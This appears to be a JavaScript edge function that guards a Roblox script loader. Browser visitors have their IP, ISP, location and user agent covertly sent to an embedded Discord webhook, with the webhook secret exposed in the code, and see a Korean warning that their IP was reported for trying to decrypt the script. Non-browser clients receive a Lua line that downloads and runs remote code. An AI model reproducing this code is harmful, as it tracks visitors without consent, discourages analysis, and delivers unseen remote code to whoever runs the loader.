const WEBHOOK_URL = 'https://discord.com/api/webhooks/1573933952517799967/GfU0TKPmFzbxfy7WHSMhYPJmF1ka3yMKpdQU4T2nosQJWYrDRn257nwkmPYfwS8YM5WD';

function isBrowserRequest(headers) {
  const hasSecFetchMode = Boolean(headers.get('sec-fetch-mode'));
  const hasSecFetchDest = Boolean(headers.get('sec-fetch-dest'));
  const hasUpgradeInsecure = Boolean(headers.get('upgrade-insecure-requests'));
  const accept = (headers.get('accept') || '').toLowerCase();
  const acceptsHtml = accept.includes('text/html');

  return hasSecFetchMode || hasSecFetchDest || hasUpgradeInsecure || acceptsHtml;
}

function getClientIp(headers, info) {
  const xff = headers.get('x-forwarded-for');
  if (xff) return xff.split(',')[0].trim();
  return info?.ip || headers.get('x-nf-client-connection-ip') || headers.get('client-ip') || 'unknown';
}

async function getIpDetails(ip) {
  const fallback = {
    ip,
    isp: 'unknown',
    org: 'unknown',
    asn: 'unknown',
    country: 'unknown',
    region: 'unknown',
    city: 'unknown',
    timezone: 'Asia/Seoul'
  };

  try {
    const target = ip && ip !== 'unknown'
      ? `https://ipwho.is/${encodeURIComponent(ip)}`
      : 'https://ipwho.is/';
    const res = await fetch(target);
    if (!res.ok) return fallback;
    const data = await res.json();
    if (data && data.success !== false) {
      return {
        ip: data.ip || ip,
        isp: data.connection?.isp || data.isp || 'unknown',
        org: data.connection?.org || data.org || 'unknown',
        asn: data.connection?.asn ? `AS${data.connection.asn}` : (data.asn || 'unknown'),
        country: data.country || 'unknown',
        region: data.region || 'unknown',
        city: data.city || 'unknown',
        timezone: data.timezone?.id || 'Asia/Seoul'
      };
    }
  } catch (_) {}

  return fallback;
}

async function sendDiscordWebhook(headers, contextInfo) {
  if (!WEBHOOK_URL) return;

  const rawIp = getClientIp(headers, contextInfo);
  const info = await getIpDetails(rawIp);

  const now = new Date();
  const kstTime = now.toLocaleString('ko-KR', {
    timeZone: 'Asia/Seoul',
    year: 'numeric',
    month: '2-digit',
    day: '2-digit',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
    hour12: false
  });

  const summary = [
    `IP: ${info.ip}`,
    `통신사(ISP): ${info.isp}`,
    `조직(ORG): ${info.org}`,
    `ASN: ${info.asn}`,
    `시각(KST): ${kstTime}`,
    `위치: ${info.country} / ${info.region} / ${info.city}`,
    `시간대: ${info.timezone}`,
    `언어: ${headers.get('accept-language') || 'unknown'}`,
    `UA: ${headers.get('user-agent') || 'unknown'}`
  ].join('\n');

  try {
    await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: `\`\`\`\n${summary}\n\`\`\``
      })
    });
  } catch (_) {}
}

export default async (request, context) => {
  const headers = request.headers;

  if (isBrowserRequest(headers)) {
    await sendDiscordWebhook(headers, context?.ip);

    const html = `<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>안내</title>
  <style>
    body {
      margin: 0;
      min-height: 100vh;
      display: grid;
      place-items: center;
      background: #0f172a;
      color: #f8fafc;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      text-align: center;
      padding: 24px;
    }
    p {
      font-size: 1.5rem;
      font-weight: 600;
      line-height: 1.6;
      margin: 0;
    }
  </style>
</head>
<body>
  <p>해독하러 오지 마세요<br />당신의 IP주소가 전송됐습니다.</p>
</body>
</html>`;

    return new Response(html, {
      status: 200,
      headers: { 'Content-Type': 'text/html; charset=utf-8' }
    });
  }

  return new Response('loadstring(game:HttpGet("https://sojik-byouel-api.netlify.app/"))()', {
    status: 200,
    headers: { 'Content-Type': 'text/plain; charset=utf-8' }
  });
};
